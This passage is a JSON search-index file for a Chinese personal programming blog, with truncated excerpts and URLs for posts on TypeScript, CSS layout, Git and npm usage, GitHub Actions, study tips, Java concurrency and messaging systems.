里，接口的作用就是为这些类型命名和为","lvl0":"接口","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"379eb49ecf47d1b9ceb187c1d2b6995f","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/03.%E6%8E%A5%E5%8F%A3/"},{"content":"类 对于传统的 JavaScript 程序我们会使用函数和基于原型的继承来创建可重用的组件，但对于熟悉使用面向对象方式的程序员使用这些语法就有些棘手，因为他们用的是","lvl0":"类","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"593b6057fd1e609aa3a34af39eee5933","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/04.%E7%B1%BB/"},{"content":"类型推断 这节介绍 TypeScript 里的类型推断。即，类型是在哪里如何被推断的。 基础 TypeScript 里，在有些没有明确指出类型的地方，类型推断会帮助提供类型。如下面的例子：","lvl0":"类型推断","lvl1":["《TypeScript 从零实现 axios》","TypeScript 常用语法"],"lvl2":"摘要","objectID":"85b030b272f511ee0212254c3e9faa6f","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/02.typescript-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/07.%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD/"},{"content":"安装 TypeScript 命令行运行如下命令，全局安装 TypeScript： 1 npm install -g typescript 安装完成后，在控制台运行如下命令，检查安装是否成功(3.x)： 1 tsc -V","lvl0":"安装 TypeScript","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"a9774c7dce9470c246198c1aa14cf25b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/02.%E5%AE%89%E8%A3%85-typescript/"},{"content":"编写第一个 TypeScript 程序 在编辑器，将下面的代码输入到 greeter.ts 文件里： 1 2 3 4 5 6 7 function greeter (person) { return \u0026#39;Hello, \u0026#39; + person } let user = \u0026#39;Yee\u0026#39; console.log(greeter(user)) 编译代码 我们使用了 .ts 扩展名，但是这段代码仅","lvl0":"编写第一个 TypeScript 程序","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"048bde90f89847438ebabf78d344a850","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/03.%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA-typescript-%E7%A8%8B%E5%BA%8F/"},{"content":"简介 TypeScript 作为 JavaScript 语言的超集，它为 JavaScript 添加了可选择的类型标注，大大增强了代码的可读性和可维护性。同时，它提供最新和不断发展的 JavaScript 特性，能让我们建立更健","lvl0":"简介","lvl1":["《TypeScript 从零实现 axios》","初识 TypeScript"],"lvl2":"摘要","objectID":"4fa5049e2149a55099f6b475e569bf7e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/01.%E5%88%9D%E8%AF%86-typescript/01.%E7%AE%80%E4%BB%8B/"},{"content":"判断是否为移动端浏览器 1 2 3 4 5 6 const flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if(flag){ // 移动端 } else { // PC端 }","lvl0":"判断是否为移动端浏览器","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"58add2694eca00bf4876d81c0d9e0648","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/60.%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"content":"提高学习效率的策略 推荐一本关于学习方法的书《认知天性》，里面有讲到有一些简单实用的学习策略，能让大家学的更好、记得更牢，而且这些策略人人可用","lvl0":"提高学习效率的策略","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"b5575702d800e3b7dd194ac008df3106","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/02.%E6%8F%90%E9%AB%98%E5%AD%A6%E4%B9%A0%E6%95%88%E7%8E%87%E7%9A%84%E7%AD%96%E7%95%A5/"},{"content":"处理问题的思路 工作中遇到问题？ 遇到问题卡住了，可以先休息一会儿，调整一下状态，喝杯水走走放松放松，然后想想有没有遗漏的地方，或者其他的解决方","lvl0":"处理问题的思路","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"94e643cc14c0a61156921c4cb677e04b","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/05.%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%B7%AF/"},{"content":"自律小建议 培养专注 练习冥想、瑜伽等 排除外界干扰 手机调到勿扰，在图书馆学习等 规定学习时间 番茄时间管理——使用番茄时间管理法，选择一个待完成的任","lvl0":"自律小建议","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"46f23b4be5da06c02f559ebefdc5f679","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/04.%E8%87%AA%E5%BE%8B%E5%B0%8F%E5%BB%BA%E8%AE%AE/"},{"content":"提高记忆的技巧 多个感官并用 记忆时调用一切感官。没人的话可以大声阅读，有人的话可以默念，轻微摇晃手指等，有助于保持专注。 重复记忆 每天留出半个到","lvl0":"提高记忆的技巧","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"dc3a900c06ca3959513f9a48e43edeab","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/03.%E6%8F%90%E9%AB%98%E8%AE%B0%E5%BF%86%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"content":"GitHub + jsDelivr + TinyPNG+ PicGo 打造稳定快速、高效免费图床 前言 Q：为什么要使用图床呢？什么是图床？ A：写博客文章时，图片的上传和存放是一个问题，有的朋友可能会把","lvl0":"GitHub + jsDelivr + TinyPNG+ PicGo 打造稳定快速、高效免费图床","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"5398007933eef0e2e13109a25c4bbe2c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/03.github-+-jsdelivr-+-tinypng+-picgo-%E6%89%93%E9%80%A0%E7%A8%B3%E5%AE%9A%E5%BF%AB%E9%80%9F%E9%AB%98%E6%95%88%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"},{"content":"GitHub Actions 定时运行代码：每天定时百度链接推送 博客上线已经有些日子了，却发现百度迟迟没有收录我的博客页面，在百度推送工具当中除了有自动推送的代码嵌入","lvl0":"GitHub Actions 定时运行代码：每天定时百度链接推送","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"5b2a8cd4ea4793563f59c4f8699c0f7c","tags":["github","博客"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/03.github-actions-%E5%AE%9A%E6%97%B6%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%AF%8F%E5%A4%A9%E5%AE%9A%E6%97%B6%E7%99%BE%E5%BA%A6%E9%93%BE%E6%8E%A5%E6%8E%A8%E9%80%81/"},{"content":"GitHub Actions 实现自动部署静态博客 前言 我使用vuepress搭建了一个静态博客，挂在了Github pages和Coding pages上面。 coding pages","lvl0":"GitHub Actions 实现自动部署静态博客","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"3f73d1a5ff7573775378065b33488b59","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/02.github-actions-%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"},{"content":"nodejs递归读取所有文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); function readFileList(dir, filesList = []) { const files = fs.readdirSync(dir); console.log(files); files.forEach((item, index) =\u0026gt; { var fullPath = path.join(dir, item); const stat = fs.statSync(fullPath); if (stat.isDirectory()) {","lvl0":"nodejs递归读取所有文件","lvl1":["技术","Nodejs"],"lvl2":"摘要","objectID":"f85f5f6374008da1c3e0f652133fa831","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/03.nodejs/01.nodejs%E9%80%92%E5%BD%92%E8%AF%BB%E5%8F%96%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6/"},{"content":"CSS3之animation动画 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16","lvl0":"CSS3之animation动画","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"dc3d4a7eeb29625ef1540010812617fa","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/08.css3%E4%B9%8Banimation%E5%8A%A8%E7%94%BB/"},{"content":"CSS3之transition过渡 html结构 1 2 3 4 5 \u0026lt;div class=\u0026#34;box1\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;div1\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;div2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;div3\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 先给元素设置transition过渡，指定样式和时间，这里设置al","lvl0":"CSS3之transition过渡","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"510a31bbcd836ebc5bd3e62ff7c0b6a5","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/07.css3%E4%B9%8Btransition%E8%BF%87%E6%B8%A1/"},{"content":"ES6面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 //面向对象封装 class","lvl0":"ES6面向对象","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"9cf6e4e5d41583e94437d401789b2df9","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/04.es6%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"flex布局案例-基础 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","lvl0":"flex布局案例-基础","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"7533359ae9bd1995c55934e2fb36bc96","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/02.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E5%9F%BA%E7%A1%80/"},{"content":"flex布局案例-圣杯布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","lvl0":"flex布局案例-圣杯布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"a91a57e98ef5808925a1be7c6f3b30fe","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/04.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80/"},{"content":"flex布局案例-输入框布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18","lvl0":"flex布局案例-输入框布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"80ff167b9b2c586020a041c80aeb93b7","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/06.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E8%BE%93%E5%85%A5%E6%A1%86%E5%B8%83%E5%B1%80/"},{"content":"flex布局案例-骰子 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","lvl0":"flex布局案例-骰子","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"e66c995ad64300ea8648a8e2dfae076c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/03.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E9%AA%B0%E5%AD%90/"},{"content":"flex布局案例-网格布局 可用F12开发者工具查看元素及样式，可打开codepen在线编辑代码。 ::: demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19","lvl0":"flex布局案例-网格布局","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"96d3ec2b8b0d851799e26d7cee8086a2","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/05.flex%E5%B8%83%E5%B1%80%E6%A1%88%E4%BE%8B-%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80/"},{"content":"flex布局语法 一、flex 布局是什么？ Flex是 Flexible Box 的缩写，意为\u0026quot;弹性布局\u0026quot;，用来为盒状模型提供最大的灵活性。 任何一个","lvl0":"flex布局语法","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"3f450ff6aaaae1bc9b979f1e459dc4e1","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/01.flex%E5%B8%83%E5%B1%80%E8%AF%AD%E6%B3%95/"},{"content":"GitHub高级搜索技巧 in:name \u0026lt;关键字\u0026gt; 仓库名称带关键字查询 in:description \u0026lt;关键字\u0026gt; 仓库描述带关键字查询 in:readme \u0026lt;关键字\u0026gt; RE","lvl0":"GitHub高级搜索技巧","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"0dd63f15dc12c3bf2f64fd2d2e9b1d8c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/01.github%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/"},{"content":"Git使用手册 安装 官网下载：https://git-scm.com/downloads 下载完成后使用默认进行安装。 安装完成后，在开始菜单里找","lvl0":"Git使用手册","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"637edb9f3036e6fa6ea335e4febdee15","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/01.git%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"},{"content":"Markdown使用教程 一、Markdown 简介 Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。 应用 当前许多网站都广泛使","lvl0":"Markdown使用教程","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"9fc16129a4e31356c49295c2de4e238d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/02.markdown%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"content":"new命令原理 使用new命令时，它后面的函数依次执行下面的步骤： 创建一个空对象，作为将要返回的实例对象。 将这个空对象的原型，指向构造函数的p","lvl0":"new命令原理","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"8b0c62712b2400d46343a5e289223d2c","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/02.new%E5%91%BD%E4%BB%A4%E5%8E%9F%E7%90%86/"},{"content":"npm常用命令 简介 npm是跟随node一起安装的包（模块）管理器。常见的使用场景有以下几种： 允许用户从npm服务器下载别人编写的第三方包到本","lvl0":"npm常用命令","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"f7f600dbf181433b16120e84a66bf8f2","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/03.npm%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"content":"yaml语言教程 简介 YAML 是 \u0026ldquo;YAML Ain\u0026rsquo;t a Markup Language\u0026rdquo;（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实","lvl0":"yaml语言教程","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"e1114466d86bf3e521688f42123cfdcf","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/15.yaml%E8%AF%AD%E8%A8%80%E6%95%99%E7%A8%8B/"},{"content":"多种数组去重性能对比 测试模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 创建一个 1 ~ 10w 的数组，Array.from为ES6语法 let arr1 = Array.from(new Array(1000000),","lvl0":"多种数组去重性能对比","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"69d0cf43f25a31734c39f66bbb73741d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/06.%E5%A4%9A%E7%A7%8D%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/"},{"content":"📚Blog 这是一个兼具博客文章、知识管理、文档查找的个人网站，主要内容是Web前端技术。如果你喜欢这个博客\u0026amp;主题欢迎到GitHub点","lvl0":"关于","lvl1":null,"lvl2":"摘要","objectID":"bdf0ef2959dc6bda9164abd4b12ae2f9","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/05.%E5%85%B3%E4%BA%8E/01.%E5%85%B3%E4%BA%8E/"},{"content":"解决百度无法收录搭建在GitHub上的静态博客的问题 ::: warning 如果你正在寻找本博客的搭建文档，博主建议您查看这个仓库的README。 ::: 背景 由于Gi","lvl0":"解决百度无法收录搭建在GitHub上的个人博客的问题","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"89276fd7c9d49d0da90f99cc7e371f39","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/01.%E8%A7%A3%E5%86%B3%E7%99%BE%E5%BA%A6%E6%97%A0%E6%B3%95%E6%94%B6%E5%BD%95%E6%90%AD%E5%BB%BA%E5%9C%A8github%E4%B8%8A%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E9%97%AE%E9%A2%98/"},{"content":"面试问题集锦 请做一下自我介绍 回答提示： 一般人回答这个问题过于平常，只说姓名、年龄、工作经验，这些在简历上都有。其实，企业最希望知道的是求职者","lvl0":"面试问题集锦","lvl1":["更多","面试"],"lvl2":"摘要","objectID":"787301c7c1e4211e685a87bab9d9d2b4","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/03.%E9%9D%A2%E8%AF%95/01.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E9%9B%86%E9%94%A6/"},{"content":"使用Gitalk实现静态博客无后台评论系统 前言 Gitalk，一个基于 Github Issue 和 Preact 开发的评论插件。 下面我们来用它在vuepress搭建的博客中搭建","lvl0":"使用Gitalk实现静态博客无后台评论系统","lvl1":["技术","博客搭建"],"lvl2":"摘要","objectID":"b710bca641f9e423419acb6a48db9282","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/02.%E4%BD%BF%E7%94%A8gitalk%E5%AE%9E%E7%8E%B0%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%97%A0%E5%90%8E%E5%8F%B0%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"},{"content":"小程序笔记 基础课程部分 微信公众平台 https://mp.weixin.qq.com/ 注册时可选择类型：订阅号、服务号、小程序、企业微信 每个邮箱仅能注册一个小程序。 个人类型小程序：无法使用微","lvl0":"小程序笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"2c32b09adf561bf72142c753f4258b10","tags":["小程序"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/40.%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0/"},{"content":"::: cardList 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68","lvl0":"友情链接","lvl1":null,"lvl2":"摘要","objectID":"d9cf75c002effb53dc0d3160ac679f64","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/99.%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/"},{"content":"cyclicBarrier 用法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public static void main(String[] args) { CyclicBarrier cb = new CyclicBarrier(2); new Thread(()-\u0026gt; { try { cb.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } System.out.p","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"140cc16633e1dc3405c7a3a86c39ff86","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/cyclicbarrier/"},{"content":"你看到的未读消息提醒是真的吗？【分布式锁解决的问题】 消息和未读不一致的原因 那么在即时消息场景中，究竟会有哪些情况导致消息和未读数出现“不一致","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"fdff2ba43a3a5b394906b5c414977657","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81_%E6%B6%88%E6%81%AF%E6%9C%AA%E8%AF%BB%E6%95%B0/"},{"content":"APNs：聊一聊第三方系统级消息通道的事 在即时消息场景下，我们会依赖服务端推送技术来提升消息到达的实时性，以及通过各种手段来保证消息收发通道","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"83ad0fb10dffc93133f51fb2760008d6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/%E6%89%8B%E6%9C%BAapp%E7%B3%BB%E7%BB%9F%E6%B6%88%E6%81%AF%E9%80%9A%E9%81%93apns/"},{"content":"二叉树层序遍历 107. 二叉树的层序遍历 II Difficulty: **给定一个二叉树，返回其节点值自底向上的层序遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右","lvl0":"","lvl1":null,"lvl2":"摘要","objectID":"70f417912f2260ba90d57e450975ded5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E9%93%BE%E8%A1%A8/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"}]